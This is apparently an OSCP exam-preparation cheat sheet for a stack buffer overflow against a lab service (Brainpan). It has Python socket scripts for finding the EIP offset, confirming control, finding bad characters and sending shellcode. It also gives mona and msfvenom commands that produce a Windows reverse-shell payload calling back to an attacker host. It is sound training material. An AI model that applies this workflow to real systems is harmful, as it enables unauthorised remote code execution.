---
description: Buffer Overflow (PEN-200 Edit)
---

# OSCP BOF

- [https://www.vulnhub.com/entry/brainpan-1,51/](https://www.vulnhub.com/entry/brainpan-1,51/)

All you need to know about the BOF challenge for OSCP exam preparation.




## 1. Determine EIP Offset

Generate a unique pattern and feed it to the vulnerable application.

{% code title="bof_send_pattern.py" %}
```python
#!/usr/bin/env python3

import socket

# msf-pattern_create -l 5000
buf = b'<UNIQUE_PATTERN>'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.13.37', 1337))
s.send(buf)
s.close()
```
{% endcode %}

Calculate the offset from buffer to EIP overwrite point:

```
$ msf-pattern_offset -l 5000 -q <EIP_VALUE>
[*] Exact match at offset <EIP_OFFSET>
```




## 2. Confirm BOF

Confirm that you can actually control the EIP value - if true, it will be overwritten with `d34dc0d3`.

{% code title="bof_confirm.py" %}
```python
#!/usr/bin/env python3

import socket
import struct

def little_endian(num):
	return struct.pack('<I', num)

junk = b'A' * <EIP_OFFSET>
eip = little_endian(0xd34dc0d3)
offset = b'C' * 16

buf = junk + eip + offset

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.13.37', 1337))
s.send(buf)
s.close()
```
{% endcode %}




## 3. Enumerate the Bad Characters

Send all the possible byte values to the application. Then in the [Immunity Debugger](https://www.immunityinc.com/products/debugger/): right click on ESP -> "Follow in Dump" -> check what characters are missing or misinterpreted - they are the **bad characters** that should be excluded when generating the shellcode.

{% code title="bof_bad_chars.py" %}
```python
#!/usr/bin/env python3

import socket
import struct

def little_endian(num):
	return struct.pack('<I', num)

junk = b'A' * <EIP_OFFSET>
eip = little_endian(0xd34dc0d3)
offset = b'C' * 4

badchars = (
    b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10'
    b'\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20'
    b'\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30'
    b'\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40'
    b'\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50'
    b'\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60'
    b'\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70'
    b'\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80'
    b'\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90'
    b'\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0'
    b'\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0'
    b'\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0'
    b'\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0'
    b'\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0'
    b'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0'
    b'\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
)
buf = junk + eip + offset + badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.13.37', 1337))
s.send(buf)
s.close()
```
{% endcode %}




## 4. Build the Exploit



### I. Find the Return Address

List all loaded modules in process memory space with [mona](https://github.com/corelan/mona):

```
!mona modules
```

Choose a module with no memory protections enabled and look for `jmp esp` instruction in that module:

```
$ msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
Or
nasm > call esp
00000000  FFD4              call esp

!mona find -s "\xff\xe4" -m "application.exe"
```

Discovered pointer is the needed value for EIP to force the execution flow into malicious shellcode.



### II. Generate a Shellcode

Build a shellcode providing bad characters set from (3):

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -f python
$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f python
$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00" -e x86/shikata_ga_nai -f python
```




## 5. Exploit!

Start a netcat listener, feed the shellcode to the application and catch your shell.

{% code title="bof_exploit.py" %}
```python
#!/usr/bin/env python3

import socket
import struct

def little_endian(num):
	return struct.pack('<I', num)

junk = b'A' * <EIP_OFFSET>
eip = little_endian(0xd34dc0d3)
offset = b'C' * 4
nops = b'\x90' * 10

buf = junk + eip + offset + nops
buf += b"<SHELLCODE>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.13.37', 1337))
s.send(buf)
s.close()
```
{% endcode %}
